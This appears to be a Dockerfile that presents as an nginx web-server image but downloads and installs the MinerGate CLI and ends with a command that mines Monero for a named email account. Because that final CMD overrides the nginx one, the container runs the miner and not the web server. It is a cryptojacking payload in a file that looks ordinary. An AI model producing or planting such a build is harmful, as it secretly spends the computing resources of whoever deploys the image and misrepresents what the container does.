FROM nginx:latest

RUN DEBIAN_FRONTEND=noninteractive apt-get update
RUN apt-get install -y wget
RUN wget https://minergate.com/download/deb-cli
RUN dpkg -i deb-cli

EXPOSE 8080
CMD ["nginx", "-g", "daemon off;"]
CMD minergate-cli -user ithoaiphuong1987@gmail.com -xmr

